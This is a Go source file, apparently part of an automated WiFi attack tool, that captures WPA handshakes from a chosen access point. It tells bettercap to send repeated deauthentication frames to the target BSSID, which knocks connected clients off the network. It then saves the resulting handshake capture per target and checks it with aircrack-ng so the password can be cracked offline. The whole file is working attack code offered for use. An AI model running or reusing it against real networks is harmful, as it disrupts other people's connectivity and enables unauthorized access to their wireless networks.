package src

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

type HandshakeCapture struct {
	bettercap  *Bettercap
	db         *Database
	workingDir string
}

func NewHandshakeCapture(bettercap *Bettercap, db *Database, workingDir string) *HandshakeCapture {
	return &HandshakeCapture{
		bettercap:  bettercap,
		db:         db,
		workingDir: workingDir,
	}
}

func (h *HandshakeCapture) CaptureHandshake(target *Target, channels string) (string, error) {
	scannedDir := filepath.Join(h.workingDir, "scanned")
	targetPcap := target.ESSID + "_" + strings.ReplaceAll(strings.ToLower(target.BSSID), ":", "") + ".pcap"
	targetDir := filepath.Join(scannedDir, strings.ReplaceAll(target.BSSID, ":", ""))
	if err := os.MkdirAll(targetDir, 0755); err != nil {
		return "", err
	}

	capFile := filepath.Join(targetDir, "handshake.pcap")

	h.db.SaveTarget(target, "", StatusScanning)

	// Set up packet capture for handshakes
	h.bettercap.RunCommand(fmt.Sprintf("wifi.recon.channel %s; set ticker.period 2; set ticker.commands \"wifi.deauth %s\"; ticker on", target.Channel, target.BSSID))

	time.Sleep(12 * time.Second)
	h.bettercap.RunCommand("ticker off")
	time.Sleep(8 * time.Second)

	h.bettercap.RunCommand(fmt.Sprintf("wifi.recon.channel %s", channels))

	// Move the pcap file from home directory to scanned directory
	homeDir, err := os.UserHomeDir()
	if err != nil {
		return "", err
	}
	sourcePcap := filepath.Join(homeDir, targetPcap)

	// Check if the pcap file exists in the home directory
	if _, err := os.Stat(sourcePcap); err == nil {
		// Move the file to the target directory
		if err := os.Rename(sourcePcap, capFile); err != nil {
			return "", err
		}
	}

	if h.verifyHandshake(capFile, target.BSSID) {
		return capFile, nil
	}

	// No handshake captured, remove the directory
	os.RemoveAll(targetDir)

	return "", nil
}

func (h *HandshakeCapture) verifyHandshake(capFile, bssid string) bool {
	if _, err := os.Stat(capFile); os.IsNotExist(err) {
		return false
	}

	cmd := exec.Command("aircrack-ng", "-b", bssid, "-w", "/dev/null", capFile)
	output, _ := cmd.CombinedOutput()

	outputStr := string(output)
	// Check for handshake presence regardless of aircrack-ng exit code
	// aircrack-ng will show "1 handshake" even if dictionary is empty
	return strings.Contains(outputStr, "1 handshake") || strings.Contains(outputStr, "handshake")
}
